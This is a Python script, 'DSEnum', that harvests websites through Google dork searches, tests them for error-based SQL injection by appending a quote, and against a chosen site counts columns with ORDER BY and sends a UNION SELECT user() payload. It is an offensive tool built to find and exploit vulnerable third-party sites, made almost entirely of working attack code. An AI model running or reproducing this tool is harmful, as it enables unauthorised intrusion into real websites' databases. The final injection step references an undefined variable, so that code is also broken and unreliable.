import os
import requests
import sys
import re
from colorama import Fore
from ast import literal_eval
import urllib.parse
import time
from pathlib import Path
import shutil
import ctypes
from bs4 import BeautifulSoup
from urllib import request

def console():
    try: 
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleA("DSEnum")

        else:
            sys.stdout.write("\x1b]2;DSEnum\x07")
            
    except:
        pass

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def main():
    console()

    try:
        if sys.argv[1] == "--search":
            dork = str(input(f"{Fore.RED}[Dork]: "))
            pages = int(input(f"{Fore.RED}[Google Pages]: "))
            time.sleep(1)
            search(dork, pages)

        elif sys.argv[1] == "--beautify":
            sites = input(f"{Fore.RED}[File]: ")
            beautify(sites)

        elif sys.argv[1] == "--inject":
            file = input(f"{Fore.RED}[File]: ")
            time.sleep(1)
            inject(file)

        elif sys.argv[1] == "--exploit":
            site = input(f"{Fore.RED}[Site + Parameter]: ")
            time.sleep(1)
            exploit(site)

        elif sys.argv[1] == "--title":
            site = input("[Site]: ")
            title(site)

        else:
            pass

    except IndexError:
        logo = f"""{Fore.RED}
██████╗ ███████╗      ███████╗███╗   ██╗██╗   ██╗███╗   ███╗
██╔══██╗██╔════╝      ██╔════╝████╗  ██║██║   ██║████╗ ████║
██║  ██║███████╗█████╗█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
██║  ██║╚════██║╚════╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
██████╔╝███████║      ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
╚═════╝ ╚══════╝      ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
    Usage : python3 main.py --search | --beautify | --inject
        """
        print(logo)

def title(site):
    console()

    try:
        html = request.urlopen(site).read()
        html[:60]
        soup = BeautifulSoup(html, 'html.parser')
        global title
        title = soup.title.string

    except:
        pass

def search(dork, pages):
    console()

    try:
        p = Path('Results')
        sites = []
        user_agent = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
        }

        for i in range(0, pages):
                search = requests.get("https://www.google.com/search?q=" + dork + '&start='+ str(i), headers=user_agent, allow_redirects=True)
                urls = re.findall(rb'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+])+', search.content)

                for site in urls:
                    sites.append(site)

        try:
            p.mkdir()

            with open('results.txt', 'w') as file:
                file.write(str(sites))
            
            shutil.move("results.txt", "Results")

        except FileExistsError as exc:
            print(exc)

        clear()
        time.sleep(1)
        print(f"{Fore.GREEN}[Saved Path]: /Results/results.txt")

    except:
        pass

def beautify(sites):
    console()

    try:
        p = Path('Beautified')
        load = open(sites).read()
        plain = literal_eval(load) 
        beautifier = []

        for site in plain:
            decode = site.decode().split("</span>")[0].split("\\")[0].split("&amp")[0]
            beautifier.append(str(urllib.parse.unquote(decode)) + "\n")

        close = open(sites, "w").close()

        for result in beautifier:
            file = open("beautified.txt", "a+")
            file.write(result)
            file.close()

        try:
            p.mkdir()
            shutil.move('beautified.txt', 'Beautified')

        except FileExistsError as exc:
            print(exc)

        clear()
        time.sleep(1)
        print(f"{Fore.GREEN}[Saved Path]: /Beautified/beautified.txt")

    except:
        pass

def inject(file):
    console()

    try:
        p = Path('Vulnerables')
        file = open(file).readlines()
        tab = []
        vulns = []
        errors = ["Warning: mysql_","You have an error in your SQL syntax;","function.mysql","syntax;","MySQL result index","mysql"]

        for site in file:
            tab.append(site.replace('</div></h3><div', '').replace('\n', ''))
            list(dict.fromkeys(tab))

        for check in tab:
            req = requests.get(check + "'")
            for error in errors:
                if error in req.text:
                    vulns.append(req.url)

        final = list(dict.fromkeys(vulns))

        tostr = ' '.join([str(elem) for elem in final]) #cast arr to str

        with open('vulnerables.txt', 'w') as vulnerable:
            vulnerable.write(str(tostr))

        try:
            p.mkdir()
            
            shutil.move("vulnerables.txt", "Vulnerables")

        except FileExistsError as exc:
            print(exc)

        clear()
        time.sleep(1)
        print(f"{Fore.GREEN}Saved Path : /Vulnerables/vulnerables.txt")

    except:
        pass

def exploit(site):
    console()

    try:
        global user_agent
        user_agent = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
        }
        orderby_error = ["in 'order clause'", "Erreur SQL !"]
        orderby_statement = ["order+by+5555", "order+by+"]
        orderbyreq = requests.get(site + orderby_statement[0] + "--+-", headers=user_agent, allow_redirects=True)
        endpoint = "--+-"

        for error in orderby_error:
            if error in orderbyreq.text:
                i = 0
                for i in range(1, 25)[:-1]:
                    start = requests.get(site + orderby_statement[1] + str(i) + endpoint, headers=user_agent, allow_redirects=True)

                    for error in orderby_error:
                        if error not in start.text:
                            continue

                        if error in start.text:
                            clear()
                            global tables1 
                            tables1 = str(i - 1)
                            print(f"{Fore.YELLOW}[Tables]: " + str(i - 1))
                            raise SystemExit

            elif error not in orderbyreq.text:
                quote = requests.get(site + "'" + orderby_statement[0] + endpoint, headers=user_agent, allow_redirects=True)

                i = 0
                for i in range(1, 25)[:-1]:
                    start = requests.get(site + "'" + orderby_statement[1] + str(i) + endpoint, headers=user_agent, allow_redirects=True)

                    for error in orderby_error:
                        if error not in start.text:
                            continue

                        if error in start.text:
                            clear()
                            global tables2
                            tables2 = str(i - 1)
                            print(f"{Fore.YELLOW}[Tables]: " + str(i - 1))
                            raise SystemExit

            else:
                print(f"{Fore.RED}[Not vulnerable]")
                raise SystemExit

    except:
        pass

    try:
        union_error = ["statements have a different number of columns", "The used SELECT statements have a different number of columns"]
        union_statement = "union+select+"
        int_tables = ','.join(map(lambda x: str(x), list(range(1, i))))
        tables = str(re.sub('[0-9]', 'user()', int_tables))
        unionreq = requests.get(site + union + tables + endpoint, headers=user_agent, allow_redirects=True)
        print(unionreq.text)

    except:
        pass

main()
